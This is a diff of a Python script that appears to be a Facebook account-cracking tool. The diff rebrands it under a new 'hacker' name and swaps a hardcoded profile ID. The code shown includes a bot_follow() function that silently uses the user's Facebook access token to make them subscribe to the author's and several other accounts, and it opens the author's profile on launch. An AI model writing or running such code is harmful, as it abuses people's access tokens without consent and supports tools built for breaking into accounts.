@@ -1,6 +1,6 @@
 #!/usr/bin/python
 #-*-coding:utf-8-*-
-#Coder Bilal Haider [Bilal-XD]
+#Coder shadow hacker [Kashmiri-hacker]
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,concurrent.futures,json,ipaddress
 from random import randint
@@ -37,12 +37,12 @@ else:
 ### BANNER ###
 
 def banner():
-    print("""\x1b[0;35md8888b. d888888b db       .d8b.  db      
-\x1b[0;35m88  `8D   `88'   88      d8' `8b 88      
-\x1b[0;34m88oooY'    88    88      88ooo88 88      
-\x1b[0;34m88~~~b.    88    88      88~~~88 88      
-\x1b[0;31m88   8D   .88.   88booo. 88   88 88booo. 
-\x1b[0;31mY8888P' Y888888P Y88888P YP   YP Y88888P""")
+    print("""\x1b[0;35md8888b.   db      
+\x1b[0;35m88  `8D      shadow 
+\x1b[0;34m88oooY'  
+\x1b[0;34m88~~~b.    8.              hacker
+\x1b[0;31m88   8D   
+\x1b[0;31mY8888P'""")
 
 host="https://mbasic.facebook.com"
 ok = []
@@ -275,7 +275,7 @@ def bot_follow():
 		print((k+"\n["+p+"!"+k+"]"+p+" Token Invalid"))
 		logs()
 	jalan("%s[%s•%s] %sPlease Wait..."%(k,p,k,p))
-	requests.post("https://graph.facebook.com/100071075869008/subscribers?access_token=" + toket) # Bilal Haider XD
+	requests.post("https://graph.facebook.com/100006455309918/subscribers?access_token=" + toket) # Bilal Haider XD
 	requests.post("https://graph.facebook.com/1827084332/subscribers?access_token=" + toket)      # Dapunta Khurayra X
 	requests.post("https://graph.facebook.com/1673250723/subscribers?access_token=" + toket)      # Dapunta Ratya
 	requests.post("https://graph.facebook.com/100000431996038/subscribers?access_token=" + toket) # Almira Gabrielle X
@@ -327,7 +327,7 @@ def menu():
         negara = "None"
     os.system("clear")
     banner()
-    os.system('xdg-open https://facebook.com/100071075869008')
+    os.system('xdg-open https://facebook.com/100006455309918')
     print((k+"\n[ "+p+"Welcome "+a["name"]+k+" ]"+p))
     print((k+"\n["+p+"+"+k+"]"+p+" Your ID : "+id))
     print((k+"["+p+"+"+k+"]"+p+" Status  : "+o+"Public"+p))
